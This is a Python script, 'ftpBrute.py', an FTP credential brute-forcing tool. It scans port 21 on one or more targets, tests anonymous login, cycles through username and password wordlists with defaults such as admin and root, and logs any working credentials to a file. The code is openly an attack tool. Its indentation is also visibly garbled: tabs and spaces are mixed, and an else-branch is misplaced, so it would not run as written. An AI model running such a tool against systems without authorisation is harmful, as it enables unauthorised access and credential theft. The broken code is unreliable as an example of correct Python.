#!/usr/bin python

# -*- coding:utf-8 -*-


import argparse
import sys
import socket
from ftplib import FTP

info = '''
Usage: ./ftpBrute.py [options]\n
Options: -t, --target    <hostname/ip>   |   Target
     -a, --anon    | Perform Anonymous test
	 -tfile, --targetfile <filename> |   target list
	 -w, --wordlist  <filename>      |   Wordlist
     -upfile, --userpassfile  <filename>      |   User:Password list
	 -h, --help      <help>          |   print help
Example: ./ftpBrute.py -t 192.168.1.1 -w wordlist.txt
'''

def help():
	print(info)
	sys.exit(0)

def check_server(address, port):
	s = socket.socket()
	s.settimeout(5)

	print('Attempting to connect to '+ address + ' on port '+ str(port))
	try:
		s.connect((address, port))
		#print "Connected to %s on port %s" % (address, port)
		return True

	except socket.error as e:
		print('Connection to ' + address + ' on port '+ str(port) + ' failed: '+ str(e))
		return False
	finally:
		s.close()

def check_anonymous_login(target):
	print('Testing Anonymous login for: ' + target)
	try:
		ftp = FTP(target, timeout=5)
		status = ftp.login()
		print('[+] Anonymous login is open on '+ target)
		print('[+] Username : anonymous')
		print('[+] Password : anonymous')
		ftp.quit()
		with open('./results/ftpBrute.md', 'a') as f:
			f.write('- '+target+" -> anonymous:anonymous \r\n")
		return status
	except:
		pass

def ftp_login(target, username, password):
	try:
		ftp = FTP(target, timeout=5)
		print('Tryin to Brute ' + target + ' -> ' + username +':'+ password)
		ftp.login(username, password)
		ftp.quit()
		print("\n[!] Credentials found for " + target)
		print("[!] Username : {}".format(username))
		print("[!] Password : {}".format(password))

		with open('./results/ftpBrute.md', 'a') as f:
			f.write('- '+target+" -> "+ username + ':' + password + "\r\n")

		return 1
	except:
		pass

def brute_force(target, wordlist, username=None):
	try:
		wordlist = open(wordlist, "r")
		words = wordlist.readlines()
        for word in words:
            if username is not None:
                word = word.strip()
                check = ftp_login(target, username, word)
        else:
            word = word.strip().split(':')
            check = ftp_login(target, word[0], word[1])
            if check == 1:
                return
	except:
		print("\n[-] There is no such wordlist file.")
		sys.exit(0)

def main():
	parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target",
                        help="Specify the target IP address to bruteforce [default: 127.0.0.1]",
                        default="127.0.0.1")
                        parser.add_argument("-a", "--anon",
                                            help="Selecting this option the tool will test the anonymous login",
                                            action="store_true")
                        parser.add_argument("-w", "--wordlist", help="Provide a list of words to use as passwords")
                        parser.add_argument("-upfile", "--userpassfile", help="The list of users and passwords separated by a colon ':'")
                        parser.add_argument("-tfile", "--targetfile", help="Specify a list of IP addresses to use as targets")

	args = parser.parse_args()
    usernameList = list()
    wordlist = list()
    anonymousCheck = None

	if not args.target and not args.targetfile:
		help()
		sys.exit(0)

    target = args.target
    targetfile = args.targetfile

    if not args.userpassfile:
        if not args.wordlist:
            wordlist = ["word1", "word2"]
    else:
        wordlist = args.wordlist
            usernameList = ['admin', 'root']
        else:
            userpassfile = args.userpassfile

    if targetfile is not None:
        newTargetList = []
        try:
            with open(targetfile) as data:
                targetsList = data.read().splitlines()
                
                for host in targetsList:
                    portOpen = check_server(host, 21)
                    
                    if portOpen is True:
                        if args.anon is True:
                            anonymousCheck = check_anonymous_login(host)
                        if anonymousCheck is None:
                            newTargetList.append(host)
        
            if usernameList:
                for user in usernameList:  # prende uno user alla volta da qui e lo usa per testare le creds su tutti i target
                    for host in newTargetList:
                        brute_force(host, wordlist, user)
                else:
                    for host in newTargetList:
                        brute_force(host, userpassfile)

        except Exception as e:
            print('brute: ', e)
            sys.exit(1)
        
    else:
        portOpen = check_server(target, 21)
        if portOpen is False:
            print('port is closed')
            sys.exit(0)
        else:
            if args.anon is True:
                anonymousCheck = check_anonymous_login(target)
            
            if anonymousCheck is not None:
                sys.exit(0)
            
            if usernameList:
                for user in usernameList:
                    brute_force(target, wordlist, user)
            else:
                brute_force(target, userpassfile)

if __name__ == '__main__':

	try:
		main()
		print("\n[-] Brute force finished.")

	except KeyboardInterrupt:
		print("\n[!] Keyboard Interruption detected")
		exit(1)

	except Exception as e:
		print ('main :', e)
